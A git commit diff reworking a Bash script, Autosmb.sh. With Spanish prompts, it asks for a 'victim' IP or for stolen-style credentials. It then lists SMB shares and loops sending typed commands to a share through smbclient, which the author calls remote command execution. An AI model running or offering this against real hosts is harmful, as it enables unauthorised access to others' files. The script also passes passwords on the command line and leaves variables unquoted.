9bce302f86def47102467ae8a7b79f2e2001bb6d
Hydr4Online <154698777+Hydr4Online@users.noreply.github.com>
2024-03-05 22:35:53 -0600

    Update Autosmb.sh

--- Autosmb.sh
+++ Autosmb.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Colores
+# by Hydr4Online
 
 clear
 
@@ -13,40 +13,60 @@ purpleCl="\e[0;35m\033[1m"
 turquoiseCl="\e[0;36m\033[1m"
 grayCl="\e[0;37m\033[1m"
 
-read -p "$(echo -e "${grayCl}Ingresa la IP victima: ${endCl}" )" ip_victima
+function menu(){
 
-smbclient -L ////$ip_victima// -N
+  echo -e "${grayCl}Que deseas hacer con smb${endCl}\n"
+  echo -e "${grayCl}1) Ejecucion de comandos sin credenciales${endCl}"
+  echo -e "${grayCl}2) Ejecucion de comandos con credenciales${endCL}"
+  echo -e "${grayCl}exit)${endCl}"
 
-read -p "$(echo -e "\n${grayCl}Disco que deseas seleccionar: ${endCl}")" opcion_disco
+}
 
-function Pregunta(){
+function no_credentials(){
 
-read -p "$(echo -e "\n${grayCl}Deseas ejecutar remotamente comandos yay/nay: ${endCl}")" yay_nay
+  local ip_victim
+  local disk_option
+  local yay_nay
+  local command_remote
+
+  read -p "$(echo -e "${grayCl}Ingresa la IP victima: ${endCl}" )" ip_victim
+
+  smbclient -L ////$ip_victim// -N
+
+  read -p "$(echo -e "\n${grayCl}Disco que deseas seleccionar: ${endCl}")" disk_option
+
+  function question_bucle(){
+
+  read -p "$(echo -e "\n${grayCl}Deseas ejecutar remotamente comandos yay/nay: ${endCl}")" yay_nay
 
   if [ $yay_nay == "yay" ];  then
     
-    clear
+  clear
 
-    function ejecucion_remota(){
+    while true; do
 
-    read -p "$( echo -e "${grayCl}Comando remoto --> ${endCl}")" Comando
+      read -p "$( echo -e "${grayCl}Comando remoto --> ${endCl}")" command_remote
 
-    echo
+      echo
 
-    smbclient //$ip_victima/nt4wrksv -N -c "${Comando}"
+      if [ $command_remote == "exit" ]; then
 
-    echo 
+        main
 
-    ejecucion_remota
+      else
 
-    }
+        smbclient //$ip_victim/$disk_option -N -c "${command_remote}"
 
-    ejecucion_remota
+      fi
+  
+        echo 
+
+    done
 
   elif [ $yay_nay == "nay" ]; then 
 
     clear
-    smbclient --no-pass //$ip_victima/$opcion_disco 
+    smbclient --no-pass //$ip_victim/$disk_option
 
   else
     
@@ -54,10 +74,127 @@ read -p "$(echo -e "\n${grayCl}Deseas ejecutar remotamente comandos yay/nay: ${e
     echo -e "${redCl}[!] Opcion no valida${endCl}"
     sleep 1
     clear
-    Pregunta
+    question_bucle
 
   fi
 
+  }
+
+  question_bucle
+
 }
 
-Pregunta
+function with_credentials(){
+
+  local ip_victim
+  local user_victim
+  local password
+  local disk_option
+  local yay_nay
+  local command_remote
+
+  read -p "$(echo -e "${grayCl}Ip o dominio: ${endCl}\n")" ip_victim
+
+  read -p "$(echo -e "${grayCl}Usuario: ${endCl}\n")" user_victim
+
+  read -p "$(echo -e "${grayCl}Contraseña: ${endCl}\n")" password
+
+  smbclient -L ${ip_victim} --user ${user_victim} --password ${password}
+
+  read -p "$(echo -e "\n${grayCl}Disco que deseas seleccionar: ${endCl}")" disk_option
+
+  function question_bucle(){
+
+  read -p "$(echo -e "\n${grayCl}Deseas ejecutar remotamente comandos yay/nay: ${endCl}")" yay_nay
+
+  if [ $yay_nay == "yay" ];  then
+    
+  clear
+
+    while true; do
+
+      read -p "$( echo -e "${grayCl}Comando remoto --> ${endCl}")" command_remote
+
+      echo
+
+      if [ $command_remote == "exit" ]; then
+
+        main
+
+      else
+
+        smbclient //${ip_victim}/${disk_option} --user ${user_victim} --password ${password} -c "${command_remote}"
+  
+      fi
+  
+        echo 
+
+    done
+
+  elif [ $yay_nay == "nay" ]; then 
+
+    clear
+    smbclient //${ip_victim}/${disk_option} --user ${user_victim} --password ${password}
+
+  else
+    
+    clear
+    echo -e "${redCl}[!] Opcion no valida${endCl}"
+    sleep 1
+    clear
+    question_bucle
+
+  fi
+
+  }
+
+  question_bucle
+
+}
+
+function main(){
+
+  while true; do
+  
+  clear
+  menu
+  read -p "$( echo -e "\n${redCl}Opcion deseada: ${endCl}")" option
+
+  case "$option" in 
+
+  1)
+
+    clear
+    no_credentials
+
+  ;;
+  
+  2)
+
+    clear
+    with_credentials
+
+  ;;
+
+  exit)
+
+    clear
+    exit 1
+
+  ;;
+
+  *)
+    
+    clear
+    echo -e "${redCl}[!] Opcion no valida${endCl}"
+    sleep 2
+
+  ;;
+
+  esac
+  done
+
+}
+
+main
+
